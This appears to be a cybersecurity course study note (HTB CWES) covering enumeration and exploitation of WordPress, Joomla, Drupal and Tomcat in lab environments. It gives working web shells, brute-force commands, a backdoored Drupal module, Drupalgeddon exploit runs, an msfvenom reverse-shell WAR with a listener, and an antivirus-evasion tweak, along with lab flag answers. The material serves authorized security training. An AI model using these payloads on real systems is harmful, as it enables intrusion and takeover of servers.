---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "2"
source_file: "CWES.xmind"
---

# Attacking Common Applications

## Study Companion

### Prerequisites

Web reconnaissance, authentication testing, version research, and safe exploit validation.

### Learning Outcomes

- Fingerprint products, versions, plugins, management features, and exposed artifacts.
- Correlate evidence with exact advisories and configuration prerequisites.
- Validate product-specific weaknesses with the least invasive proof.

### Practice Checkpoint

Select one discovered application and create a product sheet covering version evidence, exposed surfaces, advisories, and safe checks.

### Related Knowledge Map

- [[Maps/API and Application Security|API and Application Security]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Assess common enterprise, content-management, development, monitoring, support, and thick-client applications within an authorized scope by identifying the product and version, mapping exposed functionality, validating configuration and access-control weaknesses, and safely confirming exploitable impact. Apply a repeatable methodology rather than treating each product as a one-off target.

### Assessment Workflow
1. Confirm scope, resolve required virtual hosts, and discover web services across standard and alternate ports; collect titles, headers, screenshots, redirects, certificates, and service versions with tools such as Nmap, EyeWitness, and Aquatone.
2. Fingerprint each application manually and with product-aware tooling. Review page source, robots files, documentation, manifests, default paths, cookies, extensions, public projects, exposed repositories, and application-specific files to identify versions, plugins, themes, modules, and hidden interfaces.
3. Enumerate authentication and administrative surfaces, including CMS dashboards, Tomcat Manager/Host Manager, Jenkins Script Console, Splunk app management, PRTG notifications, GitLab projects, support portals, CGI paths, and legacy or auxiliary protocols. Test only approved default, weak, reused, or discovered credentials with controlled rate and lockout awareness.
4. Correlate exact versions and configurations with verified advisories and known weaknesses. Prioritize exposed management features, insecure defaults, outdated components, vulnerable plugins, file disclosure, directory traversal, unsafe uploads, command or code execution, and authentication or authorization bypasses.
5. Validate built-in-function abuse and known vulnerabilities with the least invasive proof available. Examples covered by the module include CMS template or module modification, WAR or application-package deployment, Jenkins Groovy execution, Splunk scripted inputs, PRTG command injection, Tomcat AJP/CGI flaws, Shellshock, ColdFusion traversal/RCE, IIS short-name disclosure, LDAP injection, and mass assignment.
6. For thick clients and service-connected binaries, combine network observation, local file and temporary-artifact review, decompilation/debugging, integrity-check analysis, and server-side behavior testing. Look for hardcoded credentials, insecure storage, path traversal, client-enforced access controls, SQL injection, exposed connection strings, and unsafe DLL/ELF behavior.
7. Establish impact conservatively, record the execution context and accessible data, remove uploaded packages or test accounts when permitted, and map each finding to concrete hardening actions such as patching, disabling unsafe features, restricting management interfaces, strengthening authentication, enforcing least privilege, and enabling monitoring and backups.

### Key Testing Principles
- Authorization and scope govern every action; do not assume that an exposed administrative interface, credential test, upload, or exploit is permitted.
- Build an evidence-based product/version inventory before selecting checks or exploits; verify prerequisites and avoid relying on banners alone.
- Combine broad discovery with manual application-aware enumeration because valuable weaknesses often reside in plugins, repositories, support workflows, default files, alternate ports, or built-in administrative features.
- Treat credentials and source artifacts as pivot points, not proof by themselves: validate access safely, minimize spraying, and assess reuse only where explicitly authorized.
- Prefer minimal-impact demonstrations of file read, authorization bypass, or command execution; avoid persistence, destructive commands, uncontrolled payloads, and unnecessary antivirus-evasion changes.
- Do not trust client-side controls. Thick clients, signed archives, local configuration, and UI restrictions may expose server-side flaws when their protocols and code paths are examined.
- Recommend layered hardening: current versions, removal of defaults and legacy endpoints, restricted admin access, strong authentication, granular authorization, input validation, secure secret handling, and actionable logging.

### Evidence and Reporting
Preserve the discovery inventory, screenshots, request/response pairs, exact product and version evidence, authentication context, tested paths, advisory references, and sanitized command output. For each confirmed issue, distinguish a vulnerable configuration from a product CVE, state prerequisites and execution privileges, provide reproducible low-impact steps, explain the affected data or business process, and recommend product-specific remediation. Record negative results and cleanup actions, redact credentials and secrets, and avoid including live shells or sensitive data beyond what is necessary to prove impact.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **192 yellow/output topics** in this module.

- [[Outputs/Modules/Attacking Common Applications Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## Part 1

### Introduction to Attacking Common Applications

- penetration testers. During our assessments, we will come across a wide variety of web applications such as
  - Content Management Systems (CMS)
  - code repositories
  - network monitoring tools
  - ticketing system
- All types of web applications (commercial, open-source, and custom) can suffer from the same kinds of vulnerabilities and misconfigurations
- Application Data
  - Category	Applications  
    Web Content Management	Joomla, Drupal, WordPress, DotNetNuke, etc.  
    Application Servers	Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc.  
    Security Information and Event Management (SIEM)	Splunk, Trustwave, LogRhythm, etc.  
    Network Management	PRTG Network Monitor, ManageEngine Opmanger, etc.  
    IT Management	Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc.  
    Software Frameworks	JBoss, Axis2, etc.  
    Customer Service Management	osTicket, Zendesk, etc.  
    Search Engines	Elasticsearch, Apache Solr, etc.  
    Software Configuration Management	Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc.  
    Software Development Tools	Jenkins, Atlassian Confluence, phpMyAdmin, etc.  
    Enterprise Application Integration	Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc.
    - PRTG Network Monitor
      - written in Delphi.
    - <https://osticket.com/>
      - osTicket is a widely-used open-source support ticketing system
    - <https://about.gitlab.com/>
      - GitLab is an open-source software development platform with
        - Git repository manager, version control, issue tracking, code review, continuous integration and deployment
- Module Targets
  - make manual entries in our /etc/hosts
    - IP=10.129.42.195
    - $ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
      - cat /etc/hosts
        - 10.129.42.195	app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local
### Application Discovery & Enumeration

- black box discovery
  - nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
  - inspect all hosts running web applications and take screenshots of each
    - <https://github.com/FortyNorthSecurity/EyeWitness>
      - can take the XML output from both Nmap and Nessus
    - <https://github.com/michenriksen/aquatone>
      - can take screenshots when provided a .txt file of hosts or an Nmap .xml file with the -nmap flag
      - currently under active development in a new fork
        - <https://github.com/shelld3v/aquatone>
- Initial Enumeration
  - sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
  - sudo nmap --open -sV 10.129.201.50
    - IIS web server is running on the default port 80
    - Splunk is running on port 8000/8089
    - PRTG Network Monitor is present on port 8080
- Using EyeWitness
  - sudo apt install eyewitness
    - or clone the repository, navigate to the Python/setup directory and run the setup.sh
  - run the default --web option to take screenshots using the Nmap XML output
    - eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
- Using Aquatone
  - wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
    - unzip aquatone_linux_amd64_1.7.0.zip
  - cat web_discovery.xml | ./aquatone -nmap
- Interpreting the Results
  - I have run EyeWitness in very large environments and generated reports with hundreds of pages that take hours to go through.
  - I found the ManageEngine OpManager
    - his instance was left configured with the default credentials admin:admin
  - I would be immediately excited to see Tomcat
    - but especially during an External Penetration Test
      - try default credentials
        - /manager
        - /host-manager
      - If we can access either
        - upload a malicious WAR file and achieve remote code execution
  - next application, http://support-dev.inlanefreight.local
    - running osTicket,
  - HTB weekly release
    - <https://0xdf.gitlab.io/2021/05/22/htb-delivery.html>
      - Delivery by IppSec.
        - <https://www.youtube.com/watch?v=gbs43E71mFM>
          - This particular box is worth studying as it shows what is possible by exploring the built-in functionality of certain common applications.
  - Internal Penetration Test
    - many printer login pages
      - which we can sometimes leverage to obtain cleartext LDAP credentials
    - ESXi and vCenter login portals
    - iLO and iDRAC login pages
    - plethora of network devices
    - IoT devices
    - IP phones
    - internal code repositories
    - SharePoint and custom intranet portals
- LAB
  - Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db)
    - sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL vhosts
    - [git clone https://github.com/RedSiege/EyeWitness.git](https://github.com/RedSiege/EyeWitness.git)
      - cd setup/
        - pip install -r requirements.txt
          - sudo ./setup.sh
    - python EyeWitness.py --web -x ~/web_discovery.xml -d inlanefreight_eyewitness
    - ls *.db
      - ew.db
  - What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive)
    - wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
      - unzip aquatone_linux_amd64_1.7.0.zip
    - cat web_discovery.xml | ./aquatone -nmap
    - firefox aquatone_report.html
      - Pages by Similarity
### WordPress - Discovery & Enumeration

- Discovery/Footprinting
  - quick way to identify a WordPress
    - /robots.txt
  - enumerate vulnerable plugins. Themes
    - wp-content/plugins
    - wp-content/themes
- Enumeration
  - looking at the page source
    - curl -s http://blog.inlanefreight.local | grep WordPress
      - WordPress core version 5.8
    - curl -s http://blog.inlanefreight.local/ | grep themes
      - Business Gravity
    - curl -s http://blog.inlanefreight.local/ | grep plugins
      - Contact Form 7 and mail-masta plugins are installed
        - /wp-content/plugins/mail-masta/
          - directory listing is enabled
            - readme.txt file is present. These files are very often helpful in fingerprinting version numbers.
              - version 1.0.0 of the plugin is installed, which suffers from a Local File Inclusion
  - Checking the page source of another page
    - curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
      - wpDiscuz plugin is installed
        - version appears to be 7.0.4
  - Enumerating Users
    - /wp-login.php.
      - an invalid username returns that the user was not found.
        - admin is confirmed to be a valid user
  - WPScan
    - sudo gem install wpscan
    - We can obtain an API token from WPVulnDB
    - sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
- LAB
  - Enumerate the host and find a flag.txt flag in an accessible directory.
    - echo '10.129.1.1 blog.inlanefreight.local' >> /etc/hosts
    - wpscan --url blog.inlanefreight.local --enumerate
      - [+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
        - 0ptions_ind3xeS_ftw!
  - Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).
    - visit http://blog.inlanefreight.local/?p=1
      - WP Sitemap Page
  - Find the version number of this plugin. (i.e., 4.5.2)
    - visit reademe.txt
      - http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
        - Stable tag: 1.6.4
### Attacking WordPress

- The scan report in the previous section returned two users registered on the website (admin and john).
- Login
  - Login Bruteforce
    - through /xmlrpc.php
      - sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
        - Username: john, Password: firebird1
  - Code Execution
    - Log in to WordPress with the credentials for the john user
      - redirect us to the admin panel.
        - Click on Appearance
          - Theme Editor
            - An alternate theme such as Twenty Nineteen can be chosen instead.
            - edit an uncommon page such as 404.php to add a web shell.
              - system($_GET[0]);
                - add this single line to the file just below the comments
                  - Click on Update File
    - curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
      - uid=33(www-data) gid=33(www-data) groups=33(www-data)
    - Metasploit
      - <https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/>
      - use exploit/unix/webapp/wp_admin_shell_upload
        - set username john
        - set password firebird1
        - set lhost 10.10.14.15
        - set rhost 10.129.42.195
        - set VHOST blog.inlanefreight.local
        - exploit
          - getuid
            - www-data (33)
- Leveraging Known Vulnerabilities
  - Vulnerable Plugins - mail-masta
    - vulnerable code for the mail-masta plugin.
      - <?php  
        include($_GET['pl']);  
        global $wpdb;  
        $camp_id=$_POST['camp_id'];  
        $masta_reports = $wpdb->prefix . "masta_reports";  
        $count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");  
        echo $count[0]->co;  
        ?>
    - Let's exploit this to retrieve the contents of the /etc/passwd file using cURL
      - curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
        - root:x:...
  - Vulnerable Plugins - wpDiscuz
    - <https://www.exploit-db.com/exploits/49967>
      - mime type detection functions bypass can be found
        - <https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/>
      - python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
        - [+] Upload Success...
          - Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot;
        - id
          - [x] Failed to execute PHP code...
      - curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
        - GIF689a;  
          uid=33(www-data) gid=33(www-data) groups=33(www-data)
- LAB
  - Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?
    - wpscan --url blog.inlanefreight.local --enumerate
      - [i] User(s) Identified:  
        [+] admin  
        ...  
        [+] doug
        - doug
  - Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.
    - gunzip rockyou.txt.gz
      - sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
        - Username: doug, Password: jessica1
  - Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.
    - curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
  - Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.
    - login as doug in /wp-admin
      - Select Theme > Twenty nineteen > select
        - add web shell after the comments
          - system($_GET[0]);
            - Update
    - curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/
      - app.inlanefreight.local  
        blog.inlanefreight.local  
        dev.inlanefreight.local  
        drupal-acc.inlanefreight.local  
        drupal-dev.inlanefreight.local  
        drupal-qa.inlanefreight.local  
        drupal.inlanefreight.local  
        html
        - curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/blog.inlanefreight.local
          - flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
            - curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat+/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
              - l00k_ma_unAuth_rc3!
### Joomla - Discovery & Enumeration

- Discovery/Footprinting
  - page source
    - curl -s http://dev.inlanefreight.local/ | grep Joomla
  - robots.txt
    - User-agent: *  
      Disallow: /administrator/  
      Disallow: /bin/  
      Disallow: /cache/  
      Disallow: /cli/  
      Disallow: /components/  
      Disallow: /includes/  
      Disallow: /installation/  
      Disallow: /language/  
      Disallow: /layouts/  
      Disallow: /libraries/  
      Disallow: /logs/  
      Disallow: /modules/  
      Disallow: /plugins/  
      Disallow: /tmp/
  - version if the README.txt file is present
    - curl -s http://dev.inlanefreight.local/README.txt | head -n 5
      - * This is a Joomla! installation/upgrade package to version 3.x
  - fingerprint the version from JavaScript files
    - media/system/js/ directory
  - browsing to administrator/manifests/files/joomla.xml.
    - curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
      - <version>3.9.4</version>
  - plugins/system/cache/cache.xml
- Enumeration
  - droopescan
    - cms scanning functionality.
    - <https://github.com/droope/droopescan>
    - sudo pip3 install droopescan
    - droopescan scan joomla --url http://dev.inlanefreight.local/
      - [+] Possible version(s):  
        3.8.10  
        3.8.11  
        [+] Possible interesting urls found:  
        Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
  - JoomlaScan
    - out-of-date and requires Python2.7 to run
      - python2 -m pip install bs4
    - python2 joomlascan.py -u http://dev.inlanefreight.local
      - find accessible directories and files and may help with fingerprinting installed extensions
  - Attempts at user enumeration
    - return a generic error message.
  - default user: admin but no default password
    - attempt to brute force the login.
      - joomla-bruteforce
        - <https://github.com/ajnik/joomla-bruteforce>
          - sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
            - admin:admin
- LAB
  - Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)
    - #echo '10.129.42.195 app.inlanefreight.local' >> /etc/hosts
      - curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
        - <version>3.10.0</version>
  - Find the password for the admin user on http://app.inlanefreight.local
    - git clone https://github.com/ajnik/joomla-bruteforce.git
      - sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
        - admin:turnkey
### Attacking Joomla

- Abusing Built-In Functionality
  - Using the credentials that we obtained
    - gain RCE
      - by customizing a template
        - If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.
        - click on Templates on the bottom left under Configuration to pull up the templates menu
          - click on a template name
            - choose protostar under the Template column header.
              - click on a page to pull up the page source
                - choose the error.php page. We'll add a PHP one-liner to gain code execution
                  - system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
                    - click on Save & Close
      - curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
        - uid=33(www-data) gid=33(www-data) groups=33(www-data)
- Leveraging Known Vulnerabilities
  - 3.9.4 was released in March of 2019. Though it is out of date
    - this version of Joomla is likely vulnerable to CVE-2019-10945
      - directory traversal and authenticated file deletion vulnerability
      - exploit script
        - <https://www.exploit-db.com/exploits/46710>
          - python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
            - index.php  
              robots.txt  
              web.config.txt
        - python3 version
          - <https://github.com/dpgg101/CVE-2019-10945>
- LAB
  - Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application
    - git clone https://github.com/dpgg101/CVE-2019-10945.git
      - python CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
        - flag_6470e394cbf6dab6a91682cc8585059b.txt
          - curl http:/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
            - j00mla_c0re_d1rtrav3rsal!
### Drupal - Discovery & Enumeration

- Discovery/Footprinting
  - can be identified in several ways
    - header or footer
      - Powered by Drupal
      - the standard Drupal logo
    - presence of
      - CHANGELOG.txt
      - README.txt
    - robots.txt
      - /node
  - nodes
    - http://drupal.inlanefreight.local/node/1
  - curl -s http://drupal.inlanefreight.local | grep Drupal
    - <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
  - users by default
    - Administrator
    - Authenticated User
      - adding and editing articles based on their permissions
    - Anonymous
- Enumeration
  - version number
    - curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
      - Drupal 7.57, 2018-02-21
    - droopescan
      - droopescan scan drupal -u http://drupal.inlanefreight.local
        - [+] Plugins found
        - [+] Possible version(s):  
          8.9.0  
          8.9.1
          - instance appears to be running version 8.9.1 of Drupal
        - [+] Possible interesting urls found:  
          Default admin - http://drupal.inlanefreight.local/user/login
- LAB
  - Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local
    - curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
      - Drupal 7.30, 2014-07-24
### Attacking Drupal

- Leveraging the PHP Filter Module
  - older versions of Drupal (before version 8)
    - it was possible to log in as an admin and enable the PHP filter
      - http://drupal-qa.inlanefreight.local/#overlay=admin/modules
        - tick the check box next to the module and scroll down to Save configuration.
          - Content --> Add content and create a Basic page.
            - malicious PHP snippet
              - <?php  
                system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);  
                ?>
                - set Text format drop-down to PHP code
                  - clicking save
                  - redirected to the new page
                    - http://drupal-qa.inlanefreight.local/node/3
                      - curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
                        - uid=33(www-data) gid=33(www-data) groups=33(www-data)
  - From version 8 onwards
    - we would have to install the module ourselves
      - downloading the most recent version of the module from the Drupal website
        - wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
    - Once downloaded
      - Location may differ based on the Drupal version and may be under the Extend menu.
      - Administration > Reports > Available updates.
      - Upload a module or theme to archive to install
        - click on Browse
          - select the file from the directory we downloaded it to, and then click Install.
      - Once the module is installed
        - click on Content
          - create a new basic page
            - similar to how we did in the Drupal 7 example.
- Uploading a Backdoored Module
  - Assuming we have administrative access to the website
  - pick a module such as CAPTCHA
    - https://www.drupal.org/project/captcha
  - Download the archive and extract its contents.
    - wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
      - tar xvf captcha-8.x-1.2.tar.gz
  - Create a PHP web shell with the contents:
    - <?php  
      system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);  
      ?>
  - create a .htaccess file (necessary )
    - HTML
      - <IfModule mod_rewrite.c>  
        RewriteEngine On  
        RewriteBase /  
        </IfModule>
        - mv shell.php .htaccess captcha
          - tar cvf captcha.tar.gz captcha/
  - click on Manage and then Extend on the sidebar
    - click on the + Install new module button
      - install page, such as http://drupal.inlanefreight.local/admin/modules/install
        - Browse to the backdoored Captcha archive and click Install.
  - Once the installation succeeds
    - browse to /modules/captcha/shell.php
      - curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
        - uid=33(www-data) gid=33(www-data) groups=33(www-data)
- Leveraging Known Vulnerabilities
  - Drupalgeddon
    - remote code execution vulnerabilities,
      - <https://www.drupal.org/SA-CORE-2014-005>
      - <https://www.drupal.org/sa-core-2018-002>
      - <https://cvedetails.com/cve/CVE-2018-7602/>
    - pre-authentication SQL injection
      - can be used to
        - upload malicious code or add an admin user.
      - adding a new admin user with this PoC script
        - <https://www.exploit-db.com/exploits/34992>
        - python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
          - [!] Administrator user created!
      - log in as an admin
        - obtain a shell through the various means discussed previously in this section
          - http://drupal-qa.inlanefreight.local/user#overlay=admin/people
    - We could also use
      - Metasploit module
        - https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/
  - Drupalgeddon2
    - PoC
      - https://www.exploit-db.com/exploits/44448
        - python3 drupalgeddon2.py
          - Check: http://drupal-dev.inlanefreight.local/hello.txt
          - curl -s http://drupal-dev.inlanefreight.local/hello.txt
            - ;-)
        - Now let's modify the script to gain remote code execution by uploading a malicious PHP file.
          - echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
            - PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
              - echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
                - python3 drupalgeddon2.py
                  - Check: http://drupal-dev.inlanefreight.local/mrb3n.php
                    - curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
                      - uid=33(www-data) gid=33(www-data) groups=33(www-data)
  - Drupalgeddon3
    - authenticated remote code execution vulnerability
      - <https://github.com/rithchard/Drupalgeddon3>
        - <https://www.drupal.org/sa-core-2018-004>
          - It requires a user to have the ability to delete a node.
      - We can exploit this using Metasploit
        - we must first log in and obtain a valid session cookie
        - exploit/multi/http/drupal_drupageddon3
          - set rhosts 10.129.42.195
          - set VHOST drupal-acc.inlanefreight.local
          - set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
          - set DRUPAL_NODE 1
          - set LHOST 10.10.14.15
          - exploit
            - meterpreter >
              - getuid
                - www-data (33)
  - LAB
    - Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.
      - exploit(unix/webapp/drupal_drupalgeddon2
        - LHOST  10.10.14.2
        - RHOSTS       10.129.1.8
        - VHOST     drupal-qa.inlanefreight.local
          - ight.local
        - run
          - Meterpreter >
            - ls /var/www/drupal.inlanefreight.local
              - flag_6470e394cbf6dab6a91682cc8585059b.txt
                - cat
                  - DrUp@l_drUp@l_3veryWh3Re!
### Tomcat - Discovery & Enumeration

- Discovery/Footprinting
  - Tomcat servers can be identified by
    - Server header in the HTTP
    - server and version via error
    - /docs page
      - curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
        - <title>Apache Tomcat 9 (9.0.30)
    - default documentation page
      - which may not be removed by administrators
        - /docs page
        - WEB-INF/web.xml
          - stores information about the routes used by the application and the classes
            - <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
              - path on disk for the class defined above would be
                - classes/com/inlanefreight/api/AdminServlet.class
        - tomcat-users.xml
          - used to allow or disallow access to the /manager and host-manager admin pages.
            - <user username="tomcat" password="tomcat" roles="manager-gui" />
            - <user username="admin" password="admin" roles="manager-gui,admin-gui" />
  - Enumeration
    - After fingerprinting the Tomcat instance
      - unless it has a known vulnerability,
      - we'll typically want to look for
        - /manager
        - /host-manager
    - Gobuster
      - gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
        - /docs (Status: 302)  
          /examples (Status: 302)  
          /manager (Status: 302)
          - log in to one of these using weak credentials
            - tomcat:tomcat
            - admin:admin
    - If we are successful in logging in
      - remote code execution
        - <https://en.wikipedia.org/wiki/WAR_(file_format)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web>
        - Metasploit module
  - LAB
    - What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?
      - curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat
        - <title>Apache Tomcat 10 (10.0.10)
    - What role does the admin user have in the configuration example?
      - web01.inlanefreight.local:8180/
        - login to /manager
          - 401  
            <role rolename="manager-gui"/>  
            <user username="tomcat" password="s3cret" roles="manager-gui"/>
            - credentials error
              - not usable
      - app-dev.inlanefreight.local:8080/managr
        - Login Successful
          - tomcat:tomcat
          - admin:admin
        - MSF
          - exploit/multi/http/tomcat_mgr_upload
            - set rhost
            - set rport 8080
            - set vhost
            - set HttpUsername admin
            - set HttpPassword admin
            - set lhost
            - run
              - (Meterpreter 2)(/) >
                - search -f web.xml
                  - cd /opt/tomcat/apache-tomcat-10.0.10/conf
                    - cat tomcat-users.xml
                      - <!--<role rolename="admin-gui" />
### Attacking Tomcat

- Tomcat Manager - Login Brute Force
  - auxiliary/scanner/http/tomcat_mgr_login
    - tomcat:admin
  - Python script
    - <https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce>
      - python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
- Tomcat Manager - WAR File Upload
  - /manager/html and enter the credentials.
  - JSP web shell
    - https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
      - <%@ page import="java.util.*,java.io.*"%>  
        <%  
        //  
        // JSP_KIT  
        //  
        // cmd.jsp = Command Execution (unix)  
        //  
        // by: Unknown  
        // modified: 27/06/2003  
        //  
        %>  
        <HTML><BODY>  
        <FORM METHOD="GET" NAME="myform" ACTION="">  
        <INPUT TYPE="text" NAME="cmd">  
        <INPUT TYPE="submit" VALUE="Send">  
        </FORM>  
        <pre>  
        <%  
        if (request.getParameter("cmd") != null) {  
        out.println("Command: " + request.getParameter("cmd") + "<BR>");  
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));  
        OutputStream os = p.getOutputStream();  
        InputStream in = p.getInputStream();  
        DataInputStream dis = new DataInputStream(in);  
        String disr = dis.readLine();  
        while ( disr != null ) {  
        out.println(disr);  
        disr = dis.readLine();  
        }  
        }  
        %>  
        </pre>  
        </BODY></HTML>
    - wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
      - zip -r backup.war cmd.jsp
  - Click on Browse to select the .war file and then click on Deploy
    - click on backup
      - 404 Not Found
        - curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
          - uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
  - msfvenom
    - to generate a malicious WAR file.
      - msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
  - Start a Netcat listener
    - nc -lnvp 4443
    - click on /backup to execute the shell
    - id
      - uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
  - Metasploit module
    - <https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/>
  - This JSP web shell is very lightweight (under 1kb) and utilizes a Bookmarklet which, minimize our footprint and possibly evade detections for standard JSP web shells
    - (though the JSP code may need to be modified a bit).
      - The web shell as is only gets detected by 2/58 anti-virus vendors.
      - A simple change such as changing
        - from
          - FileOutputStream(f);stream.write(m);o="Uploaded:
            - to
              - FileOutputStream(f);stream.write(m);o="uPlOaDeD:
                - results in 0/58 security vendors flagging the cmd.jsp file as malicious at the time of writing.
- CVE-2020-1938 : Ghostcat
  - All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100
  - <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938>
